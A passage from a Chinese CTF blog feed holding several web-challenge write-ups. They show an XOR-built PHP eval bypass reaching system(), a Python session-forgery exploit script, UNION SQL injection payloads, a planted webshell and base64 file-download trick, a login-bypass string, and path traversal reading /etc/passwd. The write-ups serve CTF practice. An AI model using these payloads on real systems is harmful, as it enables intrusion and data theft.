punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"请不要输入奇奇怪怪的函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//帮你算出答案</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>白名单制，给了很多数学函数，思路类似于构造所以可以考虑用这些数学函数通过<strong>异或</strong>/<strong>取反</strong>来构造成想要的字符。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan2'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atanh'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'bindec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ceil'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decbin'</span> <span class="token punctuation">,</span> <span class="token string single-quoted-string">'decoct'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'expm1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'floor'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fmod'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hypot'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log10'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log1p'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'max'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'min'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'octdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pi'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pow'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'round'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">&lt;=</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span> <span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$i</span><span class="token operator">.</span><span class="token variable">$j</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"^<span class="token interpolation"><span class="token variable">$i</span></span><span class="token interpolation"><span class="token variable">$j</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"==><span class="token interpolation"><span class="token variable">$exp</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br />"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;&lt;command&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>(is_nan^(6).(4)).(tan^(1).(5))</code>为_GET</p><p><code>$pi=_GET，$$pi=$_GET</code></p><p><code>$pi&#123;0&#125;($pi&#123;1&#125;)</code>即<code>$_GET&#123;0&#125;($_GET&#123;1&#125;)</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo $pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;);'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看到eval已经里面的字符串可控，就应该想到分号<code>;</code>间隔执行多个命令</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'is_nan'</span> <span class="token operator">^</span> <span class="token number">64</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'is_nan'</span> <span class="token operator">^</span> <span class="token string single-quoted-string">'64'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'is_nan'</span> <span class="token operator">^</span> <span class="token string single-quoted-string">'6'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'4'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo is_nan^64;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo is_nan^'64';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NESTCTF-2019-Love-Math-2/image-20210902185216015.png"></p><p>需要字符串异或才行，所以将数字以括号分割。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[HarekazeCTF2019]Easy Notes</title>
      <link href="/p/67449346.html"/>
      <url>/p/67449346.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[反序列化|session]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Easy-Notes/image-20210831172314653.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>需要获取admin权限拿flag</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Easy-Notes/image-20210831172357242.png"></p><p>然后登录，可以写东西，怀疑是XSS</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Easy-Notes/image-20210831172836634.png"></p><p>转了一圈没头绪，原来给了源码</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Easy-Notes/image-20210831173610225.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Easy-Notes/image-20210831173618790.png"></p><p>显然，是要构造session</p><p>session路径是在<strong>TEMP_DIR</strong>上</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Easy-Notes/image-20210831215026817.png"></p><p>而这个也被用来创建临时的打包文件，显然，可以利用这个构造。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Easy-Notes/image-20210831215105843.png"></p><p>payload:</p><p>用户名为<code>sess_</code></p><p>title为<code>|N;admin|b:1;</code></p><p>type为<code>.</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> requestsURL <span class="token operator">=</span> <span class="token string">'http://9987cba0-7fe1-48b9-a969-6c429b9f6745.node4.buuoj.cn:81/'</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    i <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token comment"># login as sess_</span>    sess <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    sess<span class="token punctuation">.</span>post<span class="token punctuation">(</span>URL <span class="token operator">+</span> <span class="token string">'login.php'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">'user'</span><span class="token punctuation">:</span> <span class="token string">'sess_'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token comment"># make a crafted note</span>    sess<span class="token punctuation">.</span>post<span class="token punctuation">(</span>URL <span class="token operator">+</span> <span class="token string">'add.php'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">'title'</span><span class="token punctuation">:</span> <span class="token string">'|N;admin|b:1;'</span><span class="token punctuation">,</span>        <span class="token string">'body'</span><span class="token punctuation">:</span> <span class="token string">'hello'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token comment"># make a fake session</span>    r <span class="token operator">=</span> sess<span class="token punctuation">.</span>get<span class="token punctuation">(</span>URL <span class="token operator">+</span> <span class="token string">'export.php?type=.'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>    sessid <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'sess_([0-9a-z-]+)'</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>sessid<span class="token punctuation">)</span>    <span class="token comment"># get the flag</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>URL <span class="token operator">+</span> <span class="token string">'?page=flag'</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> sessid    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'flag\&#123;.+\&#125;'</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本地测试了下，新建的session格式是</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Easy-Notes/image-20210831230656058.png"></p><p>关于session反序列化问题看<a href="https://syunaht.com/p/3063917200.html#toc-heading-5">刷题笔记:bestphp’s revenge</a></p><p>写入文件是这样</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Easy-Notes/image-20210901004508966.png"></p><p>经过反序列化后再序列化变这样</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Easy-Notes/image-20210901004523024.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Easy-Notes/image-20210901005442296.png"></p><p>大致想了一下，类似这种反序列化题，应该可以直接无脑<code>|N;</code>+构造好的序列化字符串。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:October 2019 Twice SQL Injection</title>
      <link href="/p/3288058269.html"/>
      <url>/p/3288058269.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[二次注入]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-October-2019-Twice-SQL-Injection/image-20210830185028272.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>还在change那里试了半天，没想到注入点竟然在登录。应该多试试的唉。</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">username &#x3D;1&#39; union select database() #username &#x3D;1&#39; union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;ctftraining&#39; # username &#x3D;1&#39; union select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;# username &#x3D;1&#39; union select flag from flag #<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数据库</p><pre class="line-numbers language-none"><code class="language-none">ctftraining<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>表</p><pre class="line-numbers language-none"><code class="language-none">flag,news,users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>列</p><pre class="line-numbers language-none"><code class="language-none">flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>数据</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;934730c7-4ab2-406b-9c62-819bc6c4e1c6&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[GKCTF 2021]easycms</title>
      <link href="/p/3674030718.html"/>
      <url>/p/3674030718.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>提示：后台五位弱口令</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GKCTF-2021-easycms/image-20210829195840158.png"></p><p>有种莫名的熟悉感，怎么感觉这个比赛我参加过。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>进/admin.php，输入admin@12345，进入后台</p><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><p>这种CMS，第一时间想到主题。</p><p>试了下主题可以导出，主题这里想导入需要创建这个文件</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GKCTF-2021-easycms/image-20210829200802221.png"></p><p>所以接下来想想办法创建下这个文件。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;var&#x2F;www&#x2F;html&#x2F;system&#x2F;tmp&#x2F;qgak.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在设计-组件-素材库里可以上传txt文件然后重命名</p><p>这样竟然还不行</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GKCTF-2021-easycms/image-20210829201527384.png"></p><p>哦 原来可以，多打了个.txt 删掉就好</p><p>都不需要上传主题了，直接在高级里改就好。</p><p>加个马</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GKCTF-2021-easycms/image-20210829201923198.png"></p><p>御剑连接下结束。</p><h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h3><p>还可以在抓个导出主题的包</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GKCTF-2021-easycms/image-20210829202744885.png"></p><p>解个码</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;var&#x2F;www&#x2F;html&#x2F;system&#x2F;tmp&#x2F;theme&#x2F;default&#x2F;123.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>于是将/flag进行base64编码</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;admin.php?m&#x3D;ui&amp;f&#x3D;downloadtheme&amp;theme&#x3D;L2ZsYWc&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接下载了flag.zip，改下后缀看下内容，结束。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[RootersCTF2019]babyWeb</title>
      <link href="/p/261607162.html"/>
      <url>/p/261607162.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[万能密码]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-babyWeb/image-20210829192436090.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>布尔盲注</p><p>sqlmap可以直接跑</p><p>库</p><pre class="line-numbers language-none"><code class="language-none">[*] information_schema[*] mysql[*] performance_schema[*] sql_injection<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-babyWeb/image-20210829194600643.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-babyWeb/image-20210829195032755.png"></p><p>跑了半天屁用没有，没想到最后是万能密码登录</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1 || 1&#x3D;1 limit 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[安洵杯 2019]iamthinking</title>
      <link href="/p/28867439.html"/>
      <url>/p/28867439.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[反序列化|POP链|ThinkPHP]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-iamthinking/image-20210827230722508.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>开局403，扫目录扫出<a href="http://www.zip/">www.zip</a></p><p>ThinkPHP6.0</p><p>搜索unserialize</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-iamthinking/image-20210827231136326.png"></p><p>其中有个parse_url绕过，在<a href="https://syunaht.com/p/2163136062.html#toc-heading-3">刷题笔记:[N1CTF 2018]eating_cms</a>有写。</p><p>太痛苦了，代码看到眼睛痛。看了半天总感觉在磨洋工，算了，我放弃了。</p><p>已经有师傅写好了相关工具</p><p><a href="https://github.com/wh1t3p1g/phpggc">https://github.com/wh1t3p1g/phpggc</a></p><p>直接生成下payload便是</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-iamthinking/image-20210828214605441.png"></p><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><p>理清思路</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
            <tag> ThinkPHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[网鼎杯 2020 青龙组]filejava</title>
      <link href="/p/697982602.html"/>
      <url>/p/697982602.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[tomcat|CVE-2014-3574|java|excel]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-filejava/image-20210827182004446.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>随便上传个文件，发现类似文件包含</p><p>尝试</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>读取成功。</p><p>尝试读取flag提示</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-filejava/image-20210827182106506.png"></p><p>输入./，抓包可以看报错，浏览器不行。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-filejava/image-20210827193424815.png"></p><pre class="line-numbers language-none"><code class="language-none">&amp;#47;usr&amp;#47;local&amp;#47;tomcat&amp;#47;webapps&amp;#47;ROOT&amp;#47;WEB-INF&amp;#47;upload&amp;#47;1&amp;#47;12&amp;#47;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查一下<a href="https://www.w3.org/MarkUp/html-spec/html-spec_13.html">HTML Markup</a>标签</p><p>或者</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-filejava/image-20210827193851369.png"></p><p>所以路径为</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;upload&#x2F;1&#x2F;12&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>既然是<strong>tomcat</strong>，第一个要查的自然是<strong>WEB-INF/web.xml</strong></p><p>访问</p><pre class="line-numbers language-none"><code class="language-none">..&#x2F;..&#x2F;..&#x2F;web.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd<span class="token punctuation">"</span></span>         <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>4.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>DownloadServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>cn.abc.servlet.DownloadServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>DownloadServlet<span class="token tag"><span class="token tag"><span 